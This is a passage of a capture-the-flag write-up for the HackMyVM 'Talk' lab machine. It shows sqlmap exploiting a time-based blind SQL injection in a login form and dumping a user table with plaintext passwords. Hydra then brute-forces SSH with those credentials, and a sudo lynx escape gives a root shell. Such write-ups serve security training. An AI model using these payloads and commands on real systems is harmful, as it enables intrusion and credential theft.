sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 5659 FROM (SELECT(SLEEP(5)))KPgz) AND 'IxSG'='IxSG&password=test
---
[18:32:41] [INFO] the back-end DBMS is MySQL
[18:32:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:32:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.108'

[*] ending @ 18:32:46 /2026-05-25/
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ sqlmap -u "http://192.168.56.108/login.php" --data "username=test&password=test" --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.4#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:34:03 /2026-05-25/

[18:34:03] [INFO] resuming back-end DBMS 'mysql'
[18:34:03] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=77003k7e2d3...vqard8egn3'). Do you want to use those [Y/n] Y
[18:34:03] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 5659 FROM (SELECT(SLEEP(5)))KPgz) AND 'IxSG'='IxSG&password=test
---
[18:34:03] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:34:03] [INFO] fetching database names
[18:34:03] [INFO] fetching number of databases
[18:34:03] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:34:09] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[18:34:19] [INFO] adjusting time delay to 1 second due to good response times
4
[18:34:20] [INFO] retrieved: information_schema
[18:35:20] [INFO] retrieved: chat
[18:35:32] [INFO] retrieved: mysql
[18:35:49] [INFO] retrieved: performance_schema
available databases [4]:
[*] chat
[*] information_schema
[*] mysql
[*] performance_schema

[18:36:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.108'

[*] ending @ 18:36:47 /2026-05-25/
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ sqlmap -u "http://192.168.56.108/login.php" --data "username=test&password=test" --batch -D chat --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:38:57 /2026-05-25/

[18:38:57] [INFO] resuming back-end DBMS 'mysql'
[18:38:57] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=6pej9pr0vbm...vm31nieif9'). Do you want to use those [Y/n] Y
[18:38:57] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 5659 FROM (SELECT(SLEEP(5)))KPgz) AND 'IxSG'='IxSG&password=test
---
[18:38:57] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:38:57] [INFO] fetching tables for database: 'chat'
[18:38:57] [INFO] fetching number of tables for database 'chat'
[18:38:57] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:39:03] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[18:39:13] [INFO] adjusting time delay to 1 second due to good response times
3
[18:39:13] [INFO] retrieved: user
[18:39:25] [INFO] retrieved: chat
[18:39:38] [INFO] retrieved: chat_room
Database: chat
[3 tables]
+-----------+
| user      |
| chat      |
| chat_room |
+-----------+

[18:40:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.108'

[*] ending @ 18:40:04 /2026-05-25/
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ sqlmap -u "http://192.168.56.108/login.php" --data "username=test&password=test" --batch -D chat -T user --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:55:37 /2026-05-25/

[18:55:37] [INFO] resuming back-end DBMS 'mysql'
[18:55:37] [INFO] testing connection to the target URL
got a refresh intent (redirect like response common to login pages) to 'index.php?attempt=failed'. Do you want to apply it from now on? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ga04fn26j07...c81vr8e9fq'). Do you want to use those [Y/n] Y
[18:55:37] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 5659 FROM (SELECT(SLEEP(5)))KPgz) AND 'IxSG'='IxSG&password=test
---
[18:55:37] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:55:37] [INFO] fetching columns for table 'user' in database 'chat'
[18:55:37] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[18:55:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[18:55:53] [INFO] adjusting time delay to 1 second due to good response times
6
[18:55:53] [INFO] retrieved: userid
[18:56:11] [INFO] retrieved: username
[18:56:34] [INFO] retrieved: password
[18:57:02] [INFO] retrieved: your_name
[18:57:35] [INFO] retrieved: email
[18:57:49] [INFO] retrieved: phone
[18:58:10] [INFO] fetching entries for table 'user' in database 'chat'
[18:58:10] [INFO] fetching number of entries for table 'user' in database 'chat'
[18:58:10] [INFO] retrieved: 5
[18:58:12] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
david@david.com
[18:59:01] [INFO] retrieved: adrianthebest
[18:59:39] [INFO] retrieved: 11
[18:59:43] [INFO] retrieved: 5
[18:59:46] [INFO] retrieved: david
[19:00:01] [INFO] retrieved: david
[19:00:16] [INFO] retrieved: jerry@jerry.com
[19:01:06] [INFO] retrieved: thatsmynonapass
[19:01:56] [INFO] retrieved: 111
[19:02:03] [INFO] retrieved: 4
[19:02:07] [INFO] retrieved: jerry
[19:02:23] [INFO] retrieved: jerry
[19:02:39] [INFO] retrieved: nona@nona.com
[19:03:27] [INFO] retrieved: myfriendtom
[19:04:03] [INFO] retrieved: 1111
[19:04:12] [INFO] retrieved: 2
[19:04:15] [INFO] retrieved: nona
[19:04:30] [INFO] retrieved: nona
[19:04:45] [INFO] retrieved: pao@yahoo.com
[19:05:33] [INFO] retrieved: pao
[19:05:44] [INFO] retrieved: 09123123123
[19:06:17] [INFO] retrieved: 1
[19:06:20] [INFO] retrieved: pao
[19:06:31] [INFO] retrieved: PaoPao
[19:06:53] [INFO] retrieved: tina@tina.com
[19:07:37] [INFO] retrieved: davidwhatpass
[19:08:18] [INFO] retrieved: 11111
[19:08:29] [INFO] retrieved: 3
[19:08:32] [INFO] retrieved: tina
[19:08:45] [INFO] retrieved: tina
Database: chat
Table: user
[5 entries]
+--------+-----------------+-------------+-----------------+----------+-----------+
| userid | email           | phone       | password        | username | your_name |
+--------+-----------------+-------------+-----------------+----------+-----------+
| 5      | david@david.com | 11          | adrianthebest   | david    | david     |
| 4      | jerry@jerry.com | 111         | thatsmynonapass | jerry    | jerry     |
| 2      | nona@nona.com   | 1111        | myfriendtom     | nona     | nona      |
| 1      | pao@yahoo.com   | 09123123123 | pao             | pao      | PaoPao    |
| 3      | tina@tina.com   | 11111       | davidwhatpass   | tina     | tina      |
+--------+-----------------+-------------+-----------------+----------+-----------+

[19:08:57] [INFO] table 'chat.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.108/dump/chat/user.csv'
[19:08:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.108'

[*] ending @ 19:08:57 /2026-05-25/
```

#### 2-2. BruteForceAttack

David, Nona, and Jerry can access via SSH.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ echo -e "david\njerry\nnona\npao\ntina" > user.txt
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ echo -e "adrianthebest\nthatsmynonapass\nmyfriendtom\npao\ndavidwhatpass" > password.txt
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ hydra -L user.txt -P password.txt ssh://192.168.56.108
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 19:11:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.56.108:22/
[22][ssh] host: 192.168.56.108   login: david   password: davidwhatpass
[22][ssh] host: 192.168.56.108   login: nona   password: thatsmynonapass
[22][ssh] host: 192.168.56.108   login: jerry   password: myfriendtom
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 19:11:53
```




#### 2-1. Access

Found user.txt

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ ssh david@192.168.56.108
The authenticity of host '192.168.56.108 (192.168.56.108)' can't be established.
ED25519 key fingerprint is: SHA256:+O1VDSPYNW+DA8Nj67QMSp2e7fsxlkLyCg0WeI/53oY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.108' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
david@192.168.56.108's password:
Linux talk 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
david@talk:~$ id
uid=1003(david) gid=1003(david) groups=1003(david)
david@talk:~$ ls
david@talk:~$ exit
logout
Connection to 192.168.56.108 closed.
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Talk]
└─$ ssh nona@192.168.56.108
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nona@192.168.56.108's password:
Linux talk 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb 18 03:32:20 2021 from 192.168.1.58
nona@talk:~$ id
uid=1000(nona) gid=1000(nona) groups=1000(nona),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
nona@talk:~$ ls
flag.sh  user.txt
nona@talk:~$ cat user.txt
wordsarelies
```

#### 2-2. PrivilegeEscalation

Found root.txt

```bash
nona@talk:~$ cat flag.sh
#!/bin/bash
echo '\033[0;35m
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     \033[0m'



echo "-------------------------"
echo "\nPWNED HOST: $(hostname)"
echo "\nPWNED DATE: $(date)"
echo "\nWHOAMI: $(id)"
echo "\nFLAG: $(cat root.txt 2>/dev/null || cat user.txt 2>/dev/null || echo "Keep trying.")"
echo "\n------------------------"
nona@talk:~$ sudo -l
Matching Defaults entries for nona on talk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nona may run the following commands on talk:
    (ALL : ALL) NOPASSWD: /usr/bin/lynx
nona@talk:~$ sudo lynx
Spawning your default shell.  Use 'exit' to return to Lynx.

root@talk:/home/nona# id
uid=0(root) gid=0(root) groups=0(root)
root@talk:/home/nona# cd /root
root@talk:~# ls
flag.sh  root.txt
root@talk:~# cat root.txt
talktomeroot
```

### 3. Conclusion & Loot

I successfully captured flags.

- **User Flag:** wordsarelies
- **Root Flag:** talktomeroot

